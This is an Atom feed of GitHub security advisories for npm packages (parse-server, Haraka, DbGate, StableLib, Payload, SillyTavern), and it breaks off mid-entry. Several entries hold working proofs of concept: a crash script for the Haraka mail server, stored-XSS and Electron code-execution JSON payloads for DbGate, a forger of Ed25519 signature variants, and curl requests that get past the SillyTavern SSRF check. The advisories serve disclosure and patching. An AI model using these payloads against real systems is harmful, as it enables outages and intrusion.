<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2026-04-01T23:09:36.290Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[parse-server] Parser Server's streaming file download bypasses afterFind file trigger authorization]]></title>
        <id>https://github.com/advisories/GHSA-hpm8-9qx6-jvwv</id>
        <link href="https://github.com/advisories/GHSA-hpm8-9qx6-jvwv"/>
        <updated>2026-04-01T23:09:14.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>File downloads via HTTP Range requests bypass the <code>afterFind(Parse.File)</code> trigger and its validators on storage adapters that support streaming (e.g. the default GridFS adapter). This allows access to files that should be protected by <code>afterFind</code> trigger authorization logic or built-in validators such as <code>requireUser</code>.</p>
<h3 id="patches">Patches</h3>
<p>The streaming file download path now executes the <code>afterFind(Parse.File)</code> trigger before sending any data. Authentication is resolved from the session token header so that trigger validators can distinguish authenticated from unauthenticated requests.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Use <code>beforeFind(Parse.File)</code> instead of <code>afterFind(Parse.File)</code> for file access authorization. The <code>beforeFind</code> trigger runs on all download paths including streaming.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-hpm8-9qx6-jvwv">https://github.com/parse-community/parse-server/security/advisories/GHSA-hpm8-9qx6-jvwv</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34784">https://nvd.nist.gov/vuln/detail/CVE-2026-34784</a></li>
<li><a href="https://github.com/parse-community/parse-server/pull/10361">https://github.com/parse-community/parse-server/pull/10361</a></li>
<li><a href="https://github.com/parse-community/parse-server/pull/10362">https://github.com/parse-community/parse-server/pull/10362</a></li>
<li><a href="https://github.com/parse-community/parse-server/commit/053109b3ee71815bc39ed84116c108ff9edbf337">https://github.com/parse-community/parse-server/commit/053109b3ee71815bc39ed84116c108ff9edbf337</a></li>
<li><a href="https://github.com/parse-community/parse-server/commit/a0b0c69fc44f87f80d793d257344e7dcbf676e22">https://github.com/parse-community/parse-server/commit/a0b0c69fc44f87f80d793d257344e7dcbf676e22</a></li>
<li><a href="https://github.com/advisories/GHSA-hpm8-9qx6-jvwv">https://github.com/advisories/GHSA-hpm8-9qx6-jvwv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hpm8-9qx6-jvwv</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-01T23:09:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[parse-server] Parser Server's streaming file download bypasses afterFind file trigger authorization]]></title>
        <id>https://github.com/advisories/GHSA-hpm8-9qx6-jvwv</id>
        <link href="https://github.com/advisories/GHSA-hpm8-9qx6-jvwv"/>
        <updated>2026-04-01T23:09:14.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>File downloads via HTTP Range requests bypass the <code>afterFind(Parse.File)</code> trigger and its validators on storage adapters that support streaming (e.g. the default GridFS adapter). This allows access to files that should be protected by <code>afterFind</code> trigger authorization logic or built-in validators such as <code>requireUser</code>.</p>
<h3 id="patches">Patches</h3>
<p>The streaming file download path now executes the <code>afterFind(Parse.File)</code> trigger before sending any data. Authentication is resolved from the session token header so that trigger validators can distinguish authenticated from unauthenticated requests.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Use <code>beforeFind(Parse.File)</code> instead of <code>afterFind(Parse.File)</code> for file access authorization. The <code>beforeFind</code> trigger runs on all download paths including streaming.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-hpm8-9qx6-jvwv">https://github.com/parse-community/parse-server/security/advisories/GHSA-hpm8-9qx6-jvwv</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34784">https://nvd.nist.gov/vuln/detail/CVE-2026-34784</a></li>
<li><a href="https://github.com/parse-community/parse-server/pull/10361">https://github.com/parse-community/parse-server/pull/10361</a></li>
<li><a href="https://github.com/parse-community/parse-server/pull/10362">https://github.com/parse-community/parse-server/pull/10362</a></li>
<li><a href="https://github.com/parse-community/parse-server/commit/053109b3ee71815bc39ed84116c108ff9edbf337">https://github.com/parse-community/parse-server/commit/053109b3ee71815bc39ed84116c108ff9edbf337</a></li>
<li><a href="https://github.com/parse-community/parse-server/commit/a0b0c69fc44f87f80d793d257344e7dcbf676e22">https://github.com/parse-community/parse-server/commit/a0b0c69fc44f87f80d793d257344e7dcbf676e22</a></li>
<li><a href="https://github.com/advisories/GHSA-hpm8-9qx6-jvwv">https://github.com/advisories/GHSA-hpm8-9qx6-jvwv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hpm8-9qx6-jvwv</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-01T23:09:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Haraka] Haraka affected by DoS via `__proto__` email header]]></title>
        <id>https://github.com/advisories/GHSA-xph3-r2jf-4vp3</id>
        <link href="https://github.com/advisories/GHSA-xph3-r2jf-4vp3"/>
        <updated>2026-04-01T22:56:12.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Sending an email with <code>__proto__:</code> as a header name crashes the Haraka worker process. </p>
<h3 id="details">Details</h3>
<p>The header parser at <code>node_modules/haraka-email-message/lib/header.js:215-218</code> stores headers in a plain <code>{}</code> object:</p>
<pre><code class="language-javascript">_add_header(key, value, method) {
    this.headers[key] ??= []          // line 216
    this.headers[key][method](value)  // line 217
}
</code></pre>
<p>When <code>key</code> is <code>__proto__</code>:</p>
<ol>
<li><code>this.headers['__proto__']</code> returns <code>Object.prototype</code> (the prototype getter)</li>
<li><code>Object.prototype</code> is not null/undefined, so <code>??=</code> is skipped</li>
<li><code>Object.prototype.push(value)</code> throws <code>TypeError: not a function</code></li>
</ol>
<p>The TypeError reaches the global <code>uncaughtException</code> handler at <code>haraka.js:26-33</code>, which calls <code>process.exit(1)</code>:</p>
<pre><code class="language-js">process.on('uncaughtException', (err) =&gt; {
    if (err.stack) {
        err.stack.split('\n').forEach((line) =&gt; logger.crit(line))
    } else {
        logger.crit(`Caught exception: ${JSON.stringify(err)}`)
    }
    logger.dump_and_exit(1)
})
</code></pre>
<h3 id="poc">PoC</h3>
<pre><code class="language-python">import socket, time

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(5)
sock.connect(("127.0.0.1", 2525))
sock.recv(4096)
sock.sendall(b"EHLO evil\r\n"); sock.recv(4096)
sock.sendall(b"MAIL FROM:&lt;x@x.com&gt;\r\n"); sock.recv(4096)
sock.sendall(b"RCPT TO:&lt;user@haraka.local&gt;\r\n"); sock.recv(4096)
sock.sendall(b"DATA\r\n"); sock.recv(4096)
# Crash payload
sock.sendall(b"From: x@x.com\r\n__proto__: crash\r\n\r\nbody\r\n.\r\n")
</code></pre>
<h3 id="impact">Impact</h3>
<p>In single-process mode (<code>nodes=0</code>), the entire server goes down. In cluster mode, the master restarts the worker, but all sessions are lost.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/haraka/Haraka/security/advisories/GHSA-xph3-r2jf-4vp3">https://github.com/haraka/Haraka/security/advisories/GHSA-xph3-r2jf-4vp3</a></li>
<li><a href="https://github.com/advisories/GHSA-xph3-r2jf-4vp3">https://github.com/advisories/GHSA-xph3-r2jf-4vp3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xph3-r2jf-4vp3</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-01T22:56:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[dbgate-web] dbgate-web: Stored XSS in applicationIcon leads to potential RCE in Electron due to unsafe renderer configuration]]></title>
        <id>https://github.com/advisories/GHSA-35xm-qvjg-8m42</id>
        <link href="https://github.com/advisories/GHSA-35xm-qvjg-8m42"/>
        <updated>2026-04-01T22:19:59.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A stored XSS vulnerability exists in DbGate because attacker-controlled SVG icon strings are rendered as raw HTML without sanitization. In the web UI this allows script execution in another user's browser; in the Electron desktop app this can escalate to local code execution because Electron is configured with <code>nodeIntegration: true</code> and <code>contextIsolation: false</code>.</p>
<h3 id="details">Details</h3>
<p>The issue is in the icon rendering path:</p>
<ul>
<li><code>packages/web/src/icons/FontIcon.svelte</code><ul>
<li>treats any icon string starting with <code>&lt;svg</code> as inline SVG</li>
<li>renders it with <code>{@html iconValue}</code> without sanitization</li>
</ul>
</li>
<li><code>packages/api/src/controllers/apps.js</code><ul>
<li>loads app definitions from disk and returns <code>applicationIcon</code> to clients unchanged</li>
</ul>
</li>
<li><code>packages/web/src/appobj/DatabaseAppObject.svelte</code><ul>
<li>passes <code>applicationIcon</code> into <code>additionalIcons</code></li>
</ul>
</li>
<li><code>packages/web/src/appobj/AppObjectCore.svelte</code><ul>
<li>renders those icons through <code>&lt;FontIcon icon={ic.icon}&gt;</code></li>
</ul>
</li>
</ul>
<p>This makes <code>applicationIcon</code> a stored XSS sink.</p>
<p>An attacker who can create or modify an app definition can store a payload in <code>applicationIcon</code>. When another user views a matching database/app entry, the payload executes in that user's session.</p>
<p>The impact is especially severe in Electron desktop because:</p>
<ul>
<li><code>app/src/electron.js</code><ul>
<li><code>nodeIntegration: true</code></li>
<li><code>contextIsolation: false</code></li>
</ul>
</li>
</ul>
<p>With that configuration, JavaScript gained through XSS can access Node/Electron APIs, making local code execution possible.</p>
<h3 id="poc">PoC</h3>
<p>This was reproduced by creating an app definition with a malicious <code>applicationIcon</code> and making it match a visible database.</p>
<p>Example payload:</p>
<pre><code class="language-json">{
  "applicationName": "XSS PoC",
  "applicationIcon": "&lt;svg xmlns=\"http://www.w3.org/2000/svg\" width=\"18\" height=\"18\"&gt;&lt;circle cx=\"9\" cy=\"9\" r=\"8\" fill=\"red\"/&gt;&lt;/svg&gt;&lt;img src=x onerror=\"alert('xss-fired')\"&gt;",
  "usageRules": [
    {
      "serverHostsList": ["postgres"],
      "databaseNamesList": ["dbgate"]
    }
  ]
}
</code></pre>
<p>After saving this app definition and opening the UI where the matching database/app icon is rendered, the JavaScript executes.</p>
<p>RCE In Electron app: </p>
<ol>
<li>Prepare an attacker-controlled application JSON file with a malicious <code>applicationIcon</code> value.</li>
<li>Set <code>usageRules</code> so the application matches a database the victim is likely to view.</li>
<li>Example payload:</li>
</ol>
<pre><code class="language-json">{
  "applicationName": "XSS PoC",
  "applicationIcon": "&lt;svg xmlns=\"http://www.w3.org/2000/svg\" width=\"18\" height=\"18\"&gt;&lt;circle cx=\"9\" cy=\"9\" r=\"8\" fill=\"red\"/&gt;&lt;/svg&gt;&lt;img src=x onerror=\"require('fs').writeFileSync(require('path').join(process.cwd(),'xss-rce-poc.txt'),'poc')\"&gt;",
  "usageRules": [
    {
      "serverHostsRegex": ".*",
      "databaseNamesRegex": ".*"
    }
  ]
}
</code></pre>
<ol start="4">
<li>Deliver this JSON file to the victim as an application definition file.</li>
<li>The victim imports or saves the file into DbGate's apps storage, for example by opening/creating an application file and saving the attacker-controlled JSON content.</li>
<li>DbGate later loads that app definition through apps/get-all-apps.</li>
<li>When the victim opens a UI view that renders the matching database/application icon, the applicationIcon value is passed into FontIcon.</li>
<li>FontIcon detects that the string starts with &lt;svg and renders it via raw {@html}.</li>
<li>The injected HTML executes in the Electron renderer process.</li>
<li>Because DbGate Desktop uses nodeIntegration: true and contextIsolation: false, the payload can access Node APIs and write the marker file xss-rce-poc.txt</li>
</ol>
<p>This demonstrates that a malicious saved application JSON file can become stored XSS in the UI and escalate to local code execution in Electron.</p>
<h3 id="impact">Impact</h3>
<p><strong>Web app</strong>
If an attacker can place a malicious application definition where another user will load it, arbitrary JavaScript executes in the victim's browser session. This can lead to token theft, session hijacking, and performing privileged actions as the victim inside DbGate.</p>
<p><strong>Electron desktop app</strong>
In the desktop app, the impact is more severe because the Electron renderer is configured with <code>nodeIntegration: true</code> and <code>contextIsolation: false</code>. If a victim imports or saves a malicious application definition and later opens a UI view that renders the icon, the XSS can access Node/Electron APIs and may result in local code execution on the victim machine.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/dbgate/dbgate/security/advisories/GHSA-35xm-qvjg-8m42">https://github.com/dbgate/dbgate/security/advisories/GHSA-35xm-qvjg-8m42</a></li>
<li><a href="https://github.com/dbgate/dbgate/commit/a7d2ed11f3f3d4dfb5d2e4e5467dedafa5fa947e">https://github.com/dbgate/dbgate/commit/a7d2ed11f3f3d4dfb5d2e4e5467dedafa5fa947e</a></li>
<li><a href="https://github.com/advisories/GHSA-35xm-qvjg-8m42">https://github.com/advisories/GHSA-35xm-qvjg-8m42</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-35xm-qvjg-8m42</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-01T22:19:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@stablelib/ed25519] StableLib Ed25519 Signature Malleability via Missing S < L Check]]></title>
        <id>https://github.com/advisories/GHSA-x3ff-w252-2g7j</id>
        <link href="https://github.com/advisories/GHSA-x3ff-w252-2g7j"/>
        <updated>2026-04-01T22:13:37.000Z</updated>
        <content type="html"><![CDATA[<h1 id="ed25519-signature-malleability-via-missing-s--l-check----same-class-as-node-forge-cve-2026-33895-cwe-347">Ed25519 Signature Malleability via Missing S &lt; L Check -- Same Class as node-forge CVE-2026-33895 (CWE-347)</h1>
<h2>Target</h2>
<ul>
<li>Repository: StableLib/stablelib (package: @stablelib/ed25519)</li>
<li>Version: 2.0.2 (latest, 2026-03-28)</li>
</ul>
<h2 id="root-cause">Root Cause</h2>
<p>The <code>verify()</code> function in <code>@stablelib/ed25519</code> does not check that the <code>S</code> component of the signature is less than the group order <code>L</code>. Per CFRG recommendations and the ZIP-215 specification, Ed25519 implementations should reject signatures where <code>S &gt;= L</code> to prevent signature malleability.</p>
<p>When <code>S &gt;= L</code>, <code>[S]B = [(S mod L)]B = [(S - L)]B</code>, meaning two different 32-byte <code>S</code> values produce the same verification result. An attacker who observes a valid signature <code>(R, S)</code> can produce a second valid signature <code>(R, S + L)</code> for the same message.</p>
<h3 id="vulnerable-code">Vulnerable code</h3>
<p><strong>File:</strong> <code>packages/ed25519/ed25519.ts</code> (compiled: <code>lib/ed25519.js:779-802</code>)</p>
<pre><code class="language-javascript">export function verify(publicKey, message, signature) {
    // ... length check, unpack public key ...
    const hs = new SHA512();
    hs.update(signature.subarray(0, 32));   // R
    hs.update(publicKey);                   // A
    hs.update(message);                     // M
    const h = hs.digest();
    reduce(h);                              // h is reduced mod L
    scalarmult(p, q, h);                    // [h](-A)
    scalarbase(q, signature.subarray(32));  // [S]B -- S NOT checked or reduced
    edadd(p, q);
    pack(t, p);
    if (verify32(signature, t)) {           // compare R
        return false;
    }
    return true;
}
</code></pre>
<p>Note that <code>h</code> is properly <code>reduce()</code>d (line 794), but <code>S</code> (signature bytes 32-63) is passed directly to <code>scalarbase()</code> without any range check.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<pre><code class="language-javascript">const ed = require('@stablelib/ed25519');

const kp = ed.generateKeyPair();
const msg = new TextEncoder().encode("Hello, world!");
const sig = ed.sign(kp.secretKey, msg);

console.log("Original valid:", ed.verify(kp.publicKey, msg, sig)); // true

// Ed25519 group order L
const L = [
  0xed, 0xd3, 0xf5, 0x5c, 0x1a, 0x63, 0x12, 0x58,
  0xd6, 0x9c, 0xf7, 0xa2, 0xde, 0xf9, 0xde, 0x14,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10
];

// Add L to S component to create malleable signature
const malSig = new Uint8Array(64);
malSig.set(sig.subarray(0, 32)); // R unchanged
let carry = 0;
for (let i = 0; i &lt; 32; i++) {
  const sum = sig[32 + i] + L[i] + carry;
  malSig[32 + i] = sum &amp; 0xff;
  carry = sum &gt;&gt; 8;
}

console.log("Malleable valid:", ed.verify(kp.publicKey, msg, malSig)); // true
console.log("Sigs differ:", !sig.every((b, i) =&gt; b === malSig[i]));    // true
</code></pre>
<p><strong>Output:</strong></p>
<pre><code>Original valid: true
Malleable valid: true
Sigs differ: true
</code></pre>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Signature malleability</strong>: Given any valid signature, an attacker can produce a second distinct valid signature for the same message without knowing the private key</li>
<li><strong>Transaction ID collision</strong>: Applications using signature bytes as unique identifiers (e.g., blockchain transaction IDs) are vulnerable to replay/double-spend attacks</li>
<li><strong>Deduplication bypass</strong>: Systems deduplicating by signature value accept the same message twice with different "signatures"</li>
<li><strong>Same vulnerability class</strong> as node-forge CVE-2026-33895 (GHSA-q67f-28xg-22rw), rated HIGH</li>
</ul>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Add an S &lt; L check before processing the signature:</p>
<pre><code class="language-javascript">// L in little-endian
const L = new Uint8Array([
  0xed, 0xd3, 0xf5, 0x5c, 0x1a, 0x63, 0x12, 0x58,
  0xd6, 0x9c, 0xf7, 0xa2, 0xde, 0xf9, 0xde, 0x14,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10
]);

function scalarLessThanL(s) {
  for (let i = 31; i &gt;= 0; i--) {
    if (s[i] &lt; L[i]) return true;
    if (s[i] &gt; L[i]) return false;
  }
  return false; // equal to L, reject
}

export function verify(publicKey, message, signature) {
    // ... existing checks ...
    if (!scalarLessThanL(signature.subarray(32))) {
        return false; // S &gt;= L, reject
    }
    // ... rest of verify ...
}
</code></pre>
<h2 id="self-review">Self-Review</h2>
<ul>
<li><strong>Is this by-design?</strong> No explicit documentation suggests malleability is intended. The library is described as implementing "Ed25519 public-key signature (EdDSA with Curve25519)" with no caveat about malleability.</li>
<li><strong>Is RFC 8032 strict about this?</strong> No. RFC 8032 does not require S &lt; L. However, the CFRG recommends it, ZIP-215 requires it, and the node-forge advisory (CVE-2026-33895) treats the identical issue as HIGH severity.</li>
<li><strong>Is this already reported?</strong> No. No existing issues or CVEs for @stablelib/ed25519 regarding malleability or S &lt; L.</li>
<li><strong>Honest weaknesses:</strong> (1) RFC 8032 does not strictly require S &lt; L. (2) Not all applications are affected -- only those depending on signature uniqueness. (3) This is malleability, not forgery -- the attacker cannot sign new messages. (4) tweetnacl has the same issue and considers it a known limitation.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/StableLib/stablelib/security/advisories/GHSA-x3ff-w252-2g7j">https://github.com/StableLib/stablelib/security/advisories/GHSA-x3ff-w252-2g7j</a></li>
<li><a href="https://github.com/advisories/GHSA-x3ff-w252-2g7j">https://github.com/advisories/GHSA-x3ff-w252-2g7j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x3ff-w252-2g7j</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-01T22:13:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@payloadcms/storage-s3] Payload has Insufficient Filename Validation in Client-Upload Signed-URL Endpoints]]></title>
        <id>https://github.com/advisories/GHSA-frq9-7j6g-v74x</id>
        <link href="https://github.com/advisories/GHSA-frq9-7j6g-v74x"/>
        <updated>2026-04-01T21:44:10.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The client-upload signed-URL endpoints for S3, GCS, Azure, and R2 did not properly sanitize filenames. An attacker could craft filenames to escape the intended storage location.</p>
<p>Consumers are affected if ALL of these are true:</p>
<ul>
<li><p>Payload version <strong>&lt; v3.78.0</strong></p>
</li>
<li><p>Using client-upload signed-URL endpoints for any supported storage adapter</p>
<h2 id="patches">Patches</h2>
</li>
</ul>
<p>This vulnerability has been patched in <strong>v3.78.0</strong>. Filename validation has been hardened for client uploads.</p>
<p>Consumers should upgrade to <strong>v3.78.0</strong> or later.</p>
<h2 id="workarounds">Workarounds</h2>
<p>Consumers can upgrade:</p>
<ul>
<li>Limit access to client-upload signed-URL endpoints to trusted users only.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/payloadcms/payload/security/advisories/GHSA-frq9-7j6g-v74x">https://github.com/payloadcms/payload/security/advisories/GHSA-frq9-7j6g-v74x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34750">https://nvd.nist.gov/vuln/detail/CVE-2026-34750</a></li>
<li><a href="https://github.com/advisories/GHSA-frq9-7j6g-v74x">https://github.com/advisories/GHSA-frq9-7j6g-v74x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-frq9-7j6g-v74x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-01T21:44:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@payloadcms/storage-r2] Payload has Insufficient Filename Validation in Client-Upload Signed-URL Endpoints]]></title>
        <id>https://github.com/advisories/GHSA-frq9-7j6g-v74x</id>
        <link href="https://github.com/advisories/GHSA-frq9-7j6g-v74x"/>
        <updated>2026-04-01T21:44:10.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The client-upload signed-URL endpoints for S3, GCS, Azure, and R2 did not properly sanitize filenames. An attacker could craft filenames to escape the intended storage location.</p>
<p>Consumers are affected if ALL of these are true:</p>
<ul>
<li><p>Payload version <strong>&lt; v3.78.0</strong></p>
</li>
<li><p>Using client-upload signed-URL endpoints for any supported storage adapter</p>
<h2 id="patches">Patches</h2>
</li>
</ul>
<p>This vulnerability has been patched in <strong>v3.78.0</strong>. Filename validation has been hardened for client uploads.</p>
<p>Consumers should upgrade to <strong>v3.78.0</strong> or later.</p>
<h2 id="workarounds">Workarounds</h2>
<p>Consumers can upgrade:</p>
<ul>
<li>Limit access to client-upload signed-URL endpoints to trusted users only.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/payloadcms/payload/security/advisories/GHSA-frq9-7j6g-v74x">https://github.com/payloadcms/payload/security/advisories/GHSA-frq9-7j6g-v74x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34750">https://nvd.nist.gov/vuln/detail/CVE-2026-34750</a></li>
<li><a href="https://github.com/advisories/GHSA-frq9-7j6g-v74x">https://github.com/advisories/GHSA-frq9-7j6g-v74x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-frq9-7j6g-v74x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-01T21:44:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@payloadcms/storage-gcs] Payload has Insufficient Filename Validation in Client-Upload Signed-URL Endpoints]]></title>
        <id>https://github.com/advisories/GHSA-frq9-7j6g-v74x</id>
        <link href="https://github.com/advisories/GHSA-frq9-7j6g-v74x"/>
        <updated>2026-04-01T21:44:10.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The client-upload signed-URL endpoints for S3, GCS, Azure, and R2 did not properly sanitize filenames. An attacker could craft filenames to escape the intended storage location.</p>
<p>Consumers are affected if ALL of these are true:</p>
<ul>
<li><p>Payload version <strong>&lt; v3.78.0</strong></p>
</li>
<li><p>Using client-upload signed-URL endpoints for any supported storage adapter</p>
<h2 id="patches">Patches</h2>
</li>
</ul>
<p>This vulnerability has been patched in <strong>v3.78.0</strong>. Filename validation has been hardened for client uploads.</p>
<p>Consumers should upgrade to <strong>v3.78.0</strong> or later.</p>
<h2 id="workarounds">Workarounds</h2>
<p>Consumers can upgrade:</p>
<ul>
<li>Limit access to client-upload signed-URL endpoints to trusted users only.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/payloadcms/payload/security/advisories/GHSA-frq9-7j6g-v74x">https://github.com/payloadcms/payload/security/advisories/GHSA-frq9-7j6g-v74x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34750">https://nvd.nist.gov/vuln/detail/CVE-2026-34750</a></li>
<li><a href="https://github.com/advisories/GHSA-frq9-7j6g-v74x">https://github.com/advisories/GHSA-frq9-7j6g-v74x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-frq9-7j6g-v74x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-01T21:44:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@payloadcms/storage-azure] Payload has Insufficient Filename Validation in Client-Upload Signed-URL Endpoints]]></title>
        <id>https://github.com/advisories/GHSA-frq9-7j6g-v74x</id>
        <link href="https://github.com/advisories/GHSA-frq9-7j6g-v74x"/>
        <updated>2026-04-01T21:44:10.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The client-upload signed-URL endpoints for S3, GCS, Azure, and R2 did not properly sanitize filenames. An attacker could craft filenames to escape the intended storage location.</p>
<p>Consumers are affected if ALL of these are true:</p>
<ul>
<li><p>Payload version <strong>&lt; v3.78.0</strong></p>
</li>
<li><p>Using client-upload signed-URL endpoints for any supported storage adapter</p>
<h2 id="patches">Patches</h2>
</li>
</ul>
<p>This vulnerability has been patched in <strong>v3.78.0</strong>. Filename validation has been hardened for client uploads.</p>
<p>Consumers should upgrade to <strong>v3.78.0</strong> or later.</p>
<h2 id="workarounds">Workarounds</h2>
<p>Consumers can upgrade:</p>
<ul>
<li>Limit access to client-upload signed-URL endpoints to trusted users only.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/payloadcms/payload/security/advisories/GHSA-frq9-7j6g-v74x">https://github.com/payloadcms/payload/security/advisories/GHSA-frq9-7j6g-v74x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34750">https://nvd.nist.gov/vuln/detail/CVE-2026-34750</a></li>
<li><a href="https://github.com/advisories/GHSA-frq9-7j6g-v74x">https://github.com/advisories/GHSA-frq9-7j6g-v74x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-frq9-7j6g-v74x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-01T21:44:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sillytavern] SillyTavern: Incomplete IP validation in /api/search/visit allows SSRF via localhost and IPv6]]></title>
        <id>https://github.com/advisories/GHSA-wm7j-m6jm-8797</id>
        <link href="https://github.com/advisories/GHSA-wm7j-m6jm-8797"/>
        <updated>2026-04-01T21:42:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="details">Details</h3>
<p>Distinct from CVE-2025-59159 and CVE-2026-26286 (all fixed in v1.16.0). This endpoint is still unpatched.</p>
<p>In <code>src/endpoints/search.js</code> line 419, the hostname is checked against <code>/^\d+\.\d+\.\d+\.\d+$/</code>. This only matches literal dotted-quad IPv4 (e.g. <code>127.0.0.1</code>, <code>10.0.0.1</code>). It does not catch:</p>
<ul>
<li><code>localhost</code> (hostname, not dotted-quad)</li>
<li><code>[::1]</code> (IPv6 loopback)</li>
<li>DNS names resolving to internal addresses (e.g. <code>localtest.me</code> -&gt; 127.0.0.1)</li>
</ul>
<p>A separate port check (<code>urlObj.port !== ''</code>) limits exploitation to services on default ports (80/443), making this lower severity than a fully unrestricted SSRF.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Start SillyTavern v1.16.0 normally</li>
<li>Send requests to compare blocked vs bypassed (requires a valid session cookie or CSRF disabled):</li>
</ol>
<pre><code class="language-bash"># Blocked — dotted-quad matched by regex
curl -s -o /dev/null -w "%{http_code}" -X POST http://127.0.0.1:8000/api/search/visit \
  -H "Content-Type: application/json" \
  -d '{"url": "http://127.0.0.1/", "html": true}'
# Returns: 400 (blocked)

# Bypassed — "localhost" is not dotted-quad
curl -s -o /dev/null -w "%{http_code}" -X POST http://127.0.0.1:8000/api/search/visit \
  -H "Content-Type: application/json" \
  -d '{"url": "http://localhost/", "html": true}'
# Returns: 500 (passed validation, fetch attempted, ECONNREFUSED because nothing on port 80)

# Bypassed — IPv6 loopback is not dotted-quad
curl -s -o /dev/null -w "%{http_code}" -X POST http://127.0.0.1:8000/api/search/visit \
  -H "Content-Type: application/json" \
  -d '{"url": "http://[::1]/", "html": true}'
# Returns: 500 (passed validation, fetch attempted)
</code></pre>
<p>The 400 vs 500 difference confirms <code>localhost</code> and <code>[::1]</code> pass the IP check. The 500 is ECONNREFUSED (nothing listening on port 80), not a validation rejection.</p>
<h3 id="impact">Impact</h3>
